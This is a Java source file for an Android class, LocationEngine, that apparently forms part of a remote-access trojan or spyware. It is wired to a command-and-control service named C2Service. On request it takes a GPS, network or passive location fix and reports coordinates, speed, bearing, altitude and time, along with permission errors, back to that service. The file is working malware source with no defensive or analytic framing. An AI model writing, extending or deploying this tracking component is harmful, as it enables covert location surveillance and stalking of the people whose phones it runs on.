package com.wuzenx.engine;

import android.content.Context;
import android.location.Location;
import android.location.LocationListener;
import android.location.LocationManager;
import android.os.Bundle;
import android.os.Handler;
import android.os.Looper;

import com.wuzenx.C2Service;

import org.json.JSONObject;

public class LocationEngine {
    private Context context;
    private C2Service c2;
    private LocationManager locationManager;
    private Handler handler = new Handler(Looper.getMainLooper());
    private boolean listening = false;

    private final LocationListener listener = new LocationListener() {
        @Override
        public void onLocationChanged(Location loc) {
            sendLocation(loc);
            stopListening();
        }

        @Override
        public void onStatusChanged(String provider, int status, Bundle extras) {}

        @Override
        public void onProviderEnabled(String provider) {}

        @Override
        public void onProviderDisabled(String provider) {
            stopListening();
        }
    };

    public LocationEngine(Context context, C2Service c2) {
        this.context = context;
        this.c2 = c2;
        this.locationManager = (LocationManager)
            context.getSystemService(Context.LOCATION_SERVICE);
    }

    public void getLocation() {
        if (listening) return;
        listening = true;

        try {
            if (locationManager.isProviderEnabled(LocationManager.GPS_PROVIDER)) {
                locationManager.requestSingleUpdate(
                    LocationManager.GPS_PROVIDER, listener, Looper.getMainLooper());
            } else if (locationManager.isProviderEnabled(
                LocationManager.NETWORK_PROVIDER)) {
                locationManager.requestSingleUpdate(
                    LocationManager.NETWORK_PROVIDER, listener, Looper.getMainLooper());
            } else if (locationManager.isProviderEnabled(
                LocationManager.PASSIVE_PROVIDER)) {
                locationManager.requestSingleUpdate(
                    LocationManager.PASSIVE_PROVIDER, listener, Looper.getMainLooper());
            } else {
                c2.sendMessage("log", "No location provider available");
                listening = false;
            }

            // Timeout after 15 seconds
            handler.postDelayed(() -> {
                if (listening) {
                    c2.sendMessage("log", "Location request timed out");
                    stopListening();
                }
            }, 15000);

        } catch (SecurityException e) {
            c2.sendMessage("log",
                "Location permission not granted: " + e.getMessage());
            listening = false;
        } catch (Exception e) {
            c2.sendMessage("log",
                "Location error: " + e.getMessage());
            listening = false;
        }
    }

    private void sendLocation(Location loc) {
        try {
            JSONObject locData = new JSONObject();
            locData.put("lat", loc.getLatitude());
            locData.put("lng", loc.getLongitude());
            locData.put("accuracy", loc.getAccuracy());
            locData.put("altitude", loc.getAltitude());
            locData.put("provider", loc.getProvider());
            locData.put("speed", loc.getSpeed());
            locData.put("bearing", loc.getBearing());
            locData.put("time", loc.getTime());

            if (C2Service.instance != null)
                C2Service.instance.sendMessage("location", locData.toString());

        } catch (Exception ignored) {}
    }

    private void stopListening() {
        try {
            locationManager.removeUpdates(listener);
        } catch (Exception ignored) {}
        listening = false;
        handler.removeCallbacksAndMessages(null);
    }
}
